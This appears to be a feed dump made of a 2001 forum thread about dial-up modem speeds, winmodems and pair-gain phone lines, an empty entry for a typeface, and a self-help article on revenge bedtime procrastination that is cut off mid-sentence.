
It's still possible that your hardware modem may give you better speeds.  After trying two winmodems, I'm not too impressed with them.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="Cybordolphin" data-content="post-959941" id="js-post-959941">

		<span id="post-959941"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959941" data-xf-init="share-tooltip" data-href="/posts/959941/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959941" rel="nofollow">
						#4
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-959941" data-lb-caption-desc="Cybordolphin · Jan 11, 2001 at 8:20 PM">

		

		<article>
			
				
			
			
				<div>Etech..<p>

What brand winmodems were they... and how long ago did you give them a whirl?</p><p>

Thanks.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="etech" data-content="post-960300" id="js-post-960300">

		<span id="post-960300"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-960300" data-xf-init="share-tooltip" data-href="/posts/960300/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-960300" rel="nofollow">
						#5
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-960300" data-lb-caption-desc="etech · Jan 11, 2001 at 9:05 PM">

		

		<article>
			
				
			
			
				<div>The first was a Genitech LT modem.<p>

It would not connect to one ISP at all and the other at only 33K.<br>
I sent it back.</p><p>

The one I have now is a Creative Digicom DI3635, good connects in the 49 to 50K range, but it seems to lag when more then one browser is open.  Downloads are in the 2 to 3k range. It is noticeably slower then my hardware modem.</p><p>

I would of kept my USR ISA hardware modem buy I gave it to my Dad to replace his 28.8.</p><p>

Oh well, maybe I'll splurge and get DSL, it is just now becomming available here.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-961944" id="js-post-961944">

		<span id="post-961944"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-961944" data-xf-init="share-tooltip" data-href="/posts/961944/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-961944" rel="nofollow">
						#6
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-961944" data-lb-caption-desc="shawnmos · Jan 12, 2001 at 12:19 AM">

		

		<article>
			
				
			
			
				<div>Crap! My 28.8 modem isn't working!!!! When I plug it in the HS led lights up but insted of the MR led lighting up like it is supposed to the CD led is flashing. No matter what I do it won't stop flashing. I remember this happened a long time ago and that is why I bought a 33.6 modem. What do those leds mean? My modem is a Motorola Lifestyle 28.8. The led lights are MR TR CD RD SD AA OH HS. Also when I would connect it to the computer the TR led would light up. It doesn't do anything now. Please help!</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-963594" id="js-post-963594">

		<span id="post-963594"></span>

		
			
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="Fardringle" data-content="post-964454" id="js-post-964454">

		<span id="post-964454"></span>

		
			
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-966395" id="js-post-966395">

		<span id="post-966395"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966395" data-xf-init="share-tooltip" data-href="/posts/966395/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966395" rel="nofollow">
						#9
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-966395" data-lb-caption-desc="shawnmos · Jan 12, 2001 at 4:08 PM">

		

		<article>
			
				
			
			
				<div>It is connected but maybe it's not making contact with the phone line. I will check it out but I doubt the is the problem since the modem does not respond when commands are sent to it.</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="H8tank" data-content="post-966538" id="js-post-966538">

		<span id="post-966538"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966538" data-xf-init="share-tooltip" data-href="/posts/966538/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966538" rel="nofollow">
						#10
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-966538" data-lb-caption-desc="H8tank · Jan 12, 2001 at 4:25 PM">

		

		<article>
			
				
			
			
				<div><blockquote data-attributes="" data-quote="" data-source="">
	
	<div>
			The reason I would ask such a thing is because the my first phone line (the one my computers are hooked up to) only connects at 24k because the line is split with someone else.
		</div>
</blockquote><br>
I would like to hear this explained...</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	
	                            
	                              
	                            
							



					

					

				





					

					
						

	


	

	

	
	<article data-author="Topochicho" data-content="post-966751" id="js-post-966751">

		<span id="post-966751"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966751" data-xf-init="share-tooltip" data-href="/posts/966751/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966751" rel="nofollow">
						#11
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-966751" data-lb-caption-desc="Topochicho · Jan 12, 2001 at 4:52 PM">

		

		<article>
			
				
			
			
				<div>Well I went with the assumption that he was saying that instead of running new twisted pair for each line, they just wired up to the original set up wires. <p>

Twisted pair comes as 4 or more wires... usually 4. Telephones only use 2 lines for a standard phone connection, so the other 2 wires are just along for the ride.  If an installer is lazy he can just wire up the second pair of wires for the second line, but this will cause carryover(hearing people on the other line) and static.</p><p>

So, due to the line impurities of this badly done install, he is unable to achieve greater than 24k.</p><p>

OR</p><p>

He's a little slow in the melon and thinks 2 phone line = half the speed.</p><p>



KNOCK KNUCK KNUCK... I think this melons a little ripe boy.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-966942" id="js-post-966942">

		<span id="post-966942"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966942" data-xf-init="share-tooltip" data-href="/posts/966942/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966942" rel="nofollow">
						#12
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-966942" data-lb-caption-desc="shawnmos · Jan 12, 2001 at 5:17 PM">

		

		<article>
			
				
			
			
				<div>All I know is one day the EVIL SPRINT DEMONS came to every house in my neighborhood and fu*ced with their box and now I connect at 24k compared to 48k i had before. My dad called them up and asked them &amp;quot;WHAT THE FU*K DID YOU DO?&amp;quot;. They said that they had run out of lines and they had to split them. Whatever the hell that means!!</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-966966" id="js-post-966966">

		<span id="post-966966"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966966" data-xf-init="share-tooltip" data-href="/posts/966966/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-966966" rel="nofollow">
						#13
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-966966" data-lb-caption-desc="shawnmos · Jan 12, 2001 at 5:20 PM">

		

		<article>
			
				
			
			
				<div>Moral of the story, NEVER move to a city that uses Sprint as their local telephone provider!!!!!!!!!</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="Fardringle" data-content="post-967273" id="js-post-967273">

		<span id="post-967273"></span>

		
			
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="fargus" data-content="post-967365" id="js-post-967365">

		<span id="post-967365"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-967365" data-xf-init="share-tooltip" data-href="/posts/967365/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-967365" rel="nofollow">
						#15
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-967365" data-lb-caption-desc="fargus · Jan 12, 2001 at 6:03 PM">

		

		<article>
			
				
			
			
				<div>I wouldn't hold my breath for the the v.91 &amp;amp; v.92 protocols. I'm an engineer for a company that sells equipment to ISP's, and none of the ones I know are talking about implementing it, especially after the pain of upgrading from v.34 to 56k. You can buy the modem, but if the ISP doesn't offer the protocol, fuhgedaboudit.</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="etech" data-content="post-967534" id="js-post-967534">

		<span id="post-967534"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-967534" data-xf-init="share-tooltip" data-href="/posts/967534/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-967534" rel="nofollow">
						#16
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-967534" data-lb-caption-desc="etech · Jan 12, 2001 at 6:26 PM">

		

		<article>
			
				
			
			
				<div><a href="http://www.sonic.net/support/56k/56kprobs.shtml" target="_blank" data-proxy-href="/proxy.php?link=http%3A%2F%2Fwww.sonic.net%2Fsupport%2F56k%2F56kprobs.shtml&amp;hash=3ac1ad198f8eeb37ccdabc3d383024ae" rel="nofollow ugc noopener">sonic.net</a><p>

The phone company also sometimes conserves copper wire by digitally multiplexing calls together, separating them at a junction box in your neighborhood, converting them to analog again and routing them to you. This is called a &amp;quot;line concentrator&amp;quot; or &amp;quot;pair-gain&amp;quot; circuit. While a full discussion of the mechanics of analog-to-digital conversion lies outside the scope of this article, let it suffice to say that the  process is inherently damaging to the signal. In a normal voice-to-voice conversation this is unnoticeable. However, a data connection under 56k protocols can not be achieved if the signal is subjected to more than one conversion. As phone companies are continually having to find new ways to route an increasing volume of call traffic, multiple digital-to-analog conversions are becoming more common. </p><p>


One of the rumors on the net when 56k modems first came out was that if you signed up for Caller ID the phone company would have to give you a seperate line.  I don't know if this is true or not.  If someone can confirm it, then it may be worth looking into to get a seperate line again.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="Cybordolphin" data-content="post-976938" id="js-post-976938">

		<span id="post-976938"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-976938" data-xf-init="share-tooltip" data-href="/posts/976938/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-976938" rel="nofollow">
						#17
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-976938" data-lb-caption-desc="Cybordolphin · Jan 14, 2001 at 1:24 AM">

		

		<article>
			
				
			
			
				<div>Interesting.. <p>

If you ask for Caller ID you might get a seperate NON pair gain line!??</p><p>

That sounds too good to be true!  Anyone else ever heard of that?  I would imagine that my phone company would simply tell me that I cannot get caller ID.  They insist that nothing can be done to get around the pair gain here.<br>
Mf$$kers.   They knew full well that with the future of internet that this would create a major problem.   Try getting DSL products too..... you will be limited to half the performance there as well.  Sure wish satellite would gain faster upload speeds.  Looks like that may happen some day soon.</p><p>

This whole pair gain deal just really pisses me off.</p></div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-981580" id="js-post-981580">

		<span id="post-981580"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-981580" data-xf-init="share-tooltip" data-href="/posts/981580/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-981580" rel="nofollow">
						#18
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-981580" data-lb-caption-desc="shawnmos · Jan 14, 2001 at 7:52 PM">

		

		<article>
			
				
			
			
				<div>I don't think DSL would be cut in half because it uses a digital line, but I dunno.</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-982902" id="js-post-982902">

		<span id="post-982902"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-982902" data-xf-init="share-tooltip" data-href="/posts/982902/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-982902" rel="nofollow">
						#19
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-982902" data-lb-caption-desc="shawnmos · Jan 14, 2001 at 10:56 PM">

		

		<article>
			
				
			
			
				<div>Am I right? I hope so cause I might get dsl some day and drop our second phone line.</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				


			
		</div>

	
		
	

	
	

</div>









	<div data-widget-id="25" data-widget-key="xfes_thread_view_below_quick_reply_similar_threads" data-widget-definition="xfes_similar_threads">
			
				<h3>Similar threads</h3>

				<div data-author="JediKnight">
				
					<a href="https://forums.anandtech.com/members/ch33zw1z.150238/" data-user-id="150238" data-xf-init="member-tooltip">
			<img src="https://forums.anandtech.com/data/avatars/s/150/150238.jpg?1670935009" alt="ch33zw1z" width="48" height="48" loading="lazy"> 
		</a>
				
			</div>
			
		</div>













										
	

									</div>
						
	
		
	
		

	
	
	                          
	                        


		
	
		
	

		

	
	
	                          
	                        


	

	

						
	

					</div>

				
	
		
	



<div>
				<ul>
					<li><a href="https://www.futureplc.com/services/advertising/">Advertising</a></li>
					<li><a href="https://www.futureplc.com/cookies-policy/">Cookies Policies</a></li>
					<li><a href="https://www.futureplc.com/privacy-policy/">Privacy</a></li>
					<li><a href="https://www.futureplc.com/terms-conditions/">Term &amp; Conditions</a></li>
				</ul>
				
			</div>



	


				
					
				
				
				
			</div>

		<div>
			
			
				
	
		
		
		

		<ul data-xf-init="notices" data-type="bottom_fixer" data-scroll-interval="6">

			
				
	<li data-notice-id="-1" data-delay-duration="0" data-display-duration="0" data-auto-dismiss="0" data-visibility="">
		
		<div>
		This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>
By continuing to use this site, you are consenting to our use of cookies.
	</div>
	</li>

			
		</ul>
	

			
		</div>

		

		
	
	
	
	
	















	
	

	




	



	



	



	






	



	




	

	

	



	

	

	

	
	
	
	
	

	

	

		
		
			
		

		

		
	
	
		
		
			
		
	


	


	
	
	                          
	                        








</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Victor Mono Typeface (195 pts)]]></title>
            <link>https://rubjo.github.io/victor-mono/</link>
            <guid>38332635</guid>
            <pubDate>Sun, 19 Nov 2023 13:53:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rubjo.github.io/victor-mono/">https://rubjo.github.io/victor-mono/</a>, See on <a href="https://news.ycombinator.com/item?id=38332635">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Revenge Bedtime Procrastination (164 pts)]]></title>
            <link>https://solvingprocrastination.com/revenge-bedtime-procrastination/</link>
            <guid>38332364</guid>
            <pubDate>Sun, 19 Nov 2023 13:16:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://solvingprocrastination.com/revenge-bedtime-procrastination/">https://solvingprocrastination.com/revenge-bedtime-procrastination/</a>, See on <a href="https://news.ycombinator.com/item?id=38332364">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text"><p><em>Revenge bedtime procrastination</em> occurs when people delay going to sleep in order to feel in control of their life and schedule. This phenomenon is particularly associated with people who feel that they have little time for themselves during the day, for example due to their work schedule, so they delay sleep until late at night in order to have leisure time that they’re in control of.</p><p>Revenge bedtime procrastination can lead to various issues, so it’s important to understand it. As such, in the following article you will learn more about this phenomenon, understand its causes, and see what you can do to deal with it effectively.</p><div id="ez-toc-container"><nav><ul><li><a href="#Examples_of_revenge_bedtime_procrastination" title="Examples of revenge bedtime procrastination">Examples of revenge bedtime procrastination</a></li><li><a href="#Origin_history_and_terminology" title="Origin, history, and terminology">Origin, history, and terminology</a></li><li><a href="#Dangers_of_revenge_bedtime_procrastination" title="Dangers of revenge bedtime procrastination">Dangers of revenge bedtime procrastination</a></li><li><a href="#Psychology_and_causes_of_revenge_bedtime_procrastination" title="Psychology and causes of revenge bedtime procrastination">Psychology and causes of revenge bedtime procrastination</a></li><li><a href="#How_to_avoid_revenge_bedtime_procrastination" title="How to avoid revenge bedtime procrastination">How to avoid revenge bedtime procrastination</a></li></ul></nav></div><h2><span id="Examples_of_revenge_bedtime_procrastination"></span>Examples of revenge bedtime procrastination<span></span></h2><p>An example of revenge bedtime procrastination is someone who spends almost all of their days either at work or dealing with errands, so they stay up late at night <a href="https://solvingprocrastination.com/social-media-procrastination/">browsing social media</a> and <a href="https://solvingprocrastination.com/online-procrastination/">watching videos on their phone</a> instead of sleeping, so they can feel that they have some control of their schedule.</p><p>Another example of revenge bedtime procrastination is a teenager who spends almost all of their days doing what their teachers and parents tell them to do, so they delay going to sleep in secret because that’s a way for them to rebel and feel in control.</p><h2><span id="Origin_history_and_terminology"></span>Origin, history, and terminology<span></span></h2><p>The concept of revenge bedtime procrastination was <a href="http://web.archive.org/web/20211017092601/https:/www.bbc.com/worklife/article/20201123-the-psychology-behind-revenge-bedtime-procrastination">popularized</a> in the following tweet, though the term has also <a href="http://web.archive.org/web/20211017092601/https:/www.bbc.com/worklife/article/20201123-the-psychology-behind-revenge-bedtime-procrastination">been used previously</a> by others:</p><blockquote><p>“Learned a very relatable term today: “報復性熬夜” (revenge bedtime procrastination), a phenomenon in which people who don’t have much control over their daytime life refuse to sleep early in order to regain some sense of freedom during late night hours.”</p><p>— Tweet by journalist Daphne K. Lee (June, <a href="http://web.archive.org/web/20211017093350/https:/twitter.com/daphnekylee/status/1277101831693275136">2020</a>)</p></blockquote><p>This concept and similar ones are sometimes referred to using other terms, such as <em>revenge sleep procrastination</em>, <em>sleep revenge</em>, and <em>revenge insomnia</em>.</p><p>The concept of revenge bedtime procrastination itself is currently largely informal, in the sense that there’s no research that investigates it directly. However, research has been conducted on related concepts on which it is based, including, most notably, <a href="https://solvingprocrastination.com/bedtime-procrastination/"><em>bedtime procrastination</em></a>, which occurs when people unnecessarily delay going to bed, especially when they know that doing so is bad for them.</p><p>A distinction is sometimes drawn between bedtime procrastination&nbsp;<em>while-in-bed procrastination</em>, which <a href="https://doi.org/10.3390/ijerph17165892">involves</a> unnecessarily postponing going to sleep after already getting into bed (e.g., by <a href="https://solvingprocrastination.com/online-procrastination/">browsing your phone</a>). However, “bedtime procrastination” is often used to refer to delaying getting into bed while <a href="https://doi.org/10.1016/B978-0-12-802862-9.00005-0">fully prepared</a> to go to sleep (e.g., after setting aside your phone). Furthermore, “bedtime procrastination” is often used synonymously with “<a href="https://solvingprocrastination.com/sleep-procrastination/">sleep procrastination</a>”, to refer to delaying going to sleep in general. Accordingly, “revenge bedtime procrastination” can also be used in a general sense, regardless of whether a person is already in bed.</p><h2><span id="Dangers_of_revenge_bedtime_procrastination"></span>Dangers of revenge bedtime procrastination<span></span></h2><p>Revenge bedtime procrastination can cause the same issues as other types of <a href="https://solvingprocrastination.com/sleep-procrastination/">sleep procrastination</a>, including <a href="https://doi.org/10.1016/j.smrv.2022.101697">primarily</a> lack of sleep, and consequently also tiredness, fatigue, and even exhaustion. This can have <a href="https://solvingprocrastination.com/procrastination-dangers/">various negative effects</a>, like worse mental health, worse physical health, and worse emotional wellbeing (e.g., due to feelings of guilt and shame). This can also cause interpersonal conflicts, for example if it frustrates people who care about the procrastinator’s wellbeing.</p><p>The low energy levels that this behavior causes can also <a href="https://doi.org/10.1002/job.2084">reduce</a> people’s capacity for <a href="https://doi.org/10.1111/joop.12191">self-regulation</a>, which makes them more likely to <a href="https://doi.org/10.3389/fpsyg.2018.02029">procrastinate</a> in other domains, like <a href="https://solvingprocrastination.com/academic-procrastination/">school</a> or <a href="https://solvingprocrastination.com/workplace-procrastination/">work</a>. In addition, this can also make people more likely to procrastinate on going to sleep again, as part of a self-perpetuating <a href="https://solvingprocrastination.com/procrastination-cycle/">sleep-procrastination cycle</a>, especially if going to sleep late <a href="https://solvingprocrastination.com/sleep-procrastination/">interferes</a> with their biological clock.</p><h2><span id="Psychology_and_causes_of_revenge_bedtime_procrastination"></span>Psychology and causes of revenge bedtime procrastination<span></span></h2><p>The main reason why people engage in revenge bedtime procrastination is their desire to feel in control, often by rebelling indirectly against someone who’s perceived as an authority figure. The authority figure can be someone specific, such as a parent, or something more general, such as societal norms.</p><p>This need for control as a primary reason for procrastination is what differentiates revenge bedtime procrastination from other <a href="https://solvingprocrastination.com/bedtime-procrastination/">bedtime procrastination</a>. Though no formal research has been conducted on this phenomenon directly yet, the definition and description of this concept align with several aspects of prior research on procrastination.</p><p>This includes research which shows that <a href="https://doi.org/10.1016/0191-8869(94)90090-6">revenge</a>, <a href="https://doi.org/10.1037/0033-2909.133.1.65">rebellion</a>, and <a href="https://doi.org/10.3200/SOCP.149.2.241-257">resentment</a> can drive people to <a href="https://doi.org/10.1016/S0191-8869(00)00019-2">procrastinate</a>, especially on tasks that are imposed on them by authority figures, and especially when procrastination allows them to <a href="https://doi.org/10.1111/ap.12173">exert</a> control and <a href="https://doi.org/10.1016/bs.adms.2019.01.001">autonomy</a> in situations where they would otherwise <a href="https://doi.org/10.1016/0092-6566(88)90015-3">struggle</a> to do so. As <a href="https://doi.org/10.1016/0191-8869(94)90090-6">one study</a> speculates:</p><blockquote><p>“Procrastination, as a passive-aggressive form of revenge, might occur more frequently in powerless individuals who have fewer outlets for revengeful actions. These individuals cannot run the risk of retaliation and thus would be more likely to engage in subtler forms of behavior than their more powerful counterparts.”</p></blockquote><p>Furthermore, revenge bedtime procrastination is also associated with the <a href="https://doi.org/10.1080/15402002.2018.1491850">concept</a>&nbsp;of&nbsp;<em>deliberate procrastination</em>, which in this context occurs when people intentionally delay going to sleep, because they feel that they deserve some time for themselves.</p><p>In addition, certain issues beyond the need for control, which can make people more likely to engage in <a href="https://solvingprocrastination.com/sleep-procrastination/">sleep procrastination</a> in general, can also make people more likely to engage in revenge bedtime procrastination. This includes poor sleep hygiene (e.g., using bright screens late at night), people’s chronotype (particularly, a preference for being up late at night), and a misaligned biological clock.</p><p>One of the key causes of sleep procrastination in this regard is the desire to <a href="https://doi.org/10.3389/fpsyg.2014.00611">keep engaging</a>&nbsp;with&nbsp;<a href="https://doi.org/10.1080/15205436.2019.1606246">available entertainment</a>, and particularly <a href="https://doi.org/10.1037/apl0000818">digital entertainment</a><em>,</em> for example by <a href="https://doi.org/10.1177/0093650216686877">watching TV</a> or <a href="https://solvingprocrastination.com/social-media-procrastination/">browsing social media</a>. Such entertainment is easily accessible from many places (e.g., people’s bedroom and bed), is stimulating enough to keep people awake in many cases, and often requires relatively little effort to engage with. This <a href="https://doi.org/10.1037/apl0000818">form</a> of <em>cyber leisure</em> is also <a href="https://doi.org/10.1080/15402002.2018.1491850">associated</a> with <em>mindless sleep procrastination</em>, which occurs when people lose track of time because they’re immersed in evening and night activities.</p><p>However, note that the activities that people engage in during revenge bedtime procrastination aren’t necessarily enjoyable, and the procrastinator may engage with them simply out of a desire to feel in control. Furthermore, even in cases where the procrastinator does derive some satisfaction and enjoyment from their behavior, the procrastinator engaging in revenge bedtime procrastination can generally expect to be worse off as a result of delaying going to sleep, for example due to resulting lack of sleep and exhaustion, as with other forms of <a href="https://solvingprocrastination.com/bedtime-procrastination/">bedtime procrastination</a>.</p><h2><span id="How_to_avoid_revenge_bedtime_procrastination"></span>How to avoid revenge bedtime procrastination<span></span></h2><p>If you realize that you’re engaging in revenge bedtime procrastination and want to stop doing it because of the issues it leads to, then you can use the following techniques:</p><ul><li>Think about—and potentially write down—how this behavior harms you.</li><li>Think about—and potentially write down—how minimizing or ending this behavior could benefit you.</li><li>Realize that you’re primarily harming yourself, rather than whoever or whatever you’re rebelling against.</li><li>Find more positive ways to feel in control and have time for yourself.</li><li>Consider working with a relevant professional (e.g., a psychologist) to address the issues that are causing you to procrastinate, especially if issues such as <a href="https://solvingprocrastination.com/anxiety/">anxiety</a> and <a href="https://solvingprocrastination.com/depression/">depression</a> are involved.</li></ul><p>In addition, you can use similar techniques as you would use to deal with general <a href="https://solvingprocrastination.com/bedtime-procrastination/">bedtime procrastination</a>:</p><ul><li><strong>Improve your bedtime habits</strong>, by finishing your obligations as early as reasonably possible before bedtime, developing a consistent and calming bedtime routine, and adding a time delay before you procrastinate (e.g., counting to 30 before indulging your impulse to procrastinate).</li><li><strong>Improve your sleep hygiene</strong>, by minimizing light exposure before bedtime (and especially exposure to bright or blue light), and avoiding stimulating activities, caffeine, tobacco, alcohol, and problematic foods (e.g., heavy meals) in the hours before bedtime.</li><li><strong>Improve your sleep environment</strong>, by removing distractions and temptations (such as digital devices), and making your bedroom and bed feel comfortable.</li><li><strong>Change your sleep habits</strong>, by setting a consistent sleep schedule, waking up earlier, and minimizing napping or avoiding it entirely.</li><li><strong>Change your general habits</strong>, by exercising, getting exposure to light throughout the day, and minimizing the use of your bed and bedroom for things other than sleeping.</li><li><strong>Improve your planning</strong>, by setting concrete goals, having a clear plan for achieving your goals, and figuring out how you will handle obstacles that you might encounter.</li><li><strong>Increase your motivation</strong>, by clearly identifying why you want to go to bed on time, visualizing your future self, reminding yourself that sleep is a top priority for you, and acknowledging and rewarding your progress.</li><li><strong>Change your mindset</strong>, by making sleep something that you look forward to, giving yourself permission to make mistakes, developing&nbsp;<a href="https://solvingprocrastination.com/self-compassion/"><em>self-compassion</em></a> (by being kind to yourself, recognizing that everyone experiences challenges, and accepting your emotions in a non-judgmental manner), and developing&nbsp;<a href="https://solvingprocrastination.com/self-efficacy/"><em>self-efficacy</em></a> (by identifying the strategies that you can use to go to bed on time and thinking about your ability to execute them successfully).</li></ul><p>It helps to start by figuring out <a href="https://solvingprocrastination.com/why-people-procrastinate/">what’s causing your procrastination</a>, so you can pick the most relevant <a href="https://solvingprocrastination.com/how-to-stop-procrastinating/">anti-procrastination techniques</a> to use in your case.</p><p>Note that you can use similar techniques to help someone 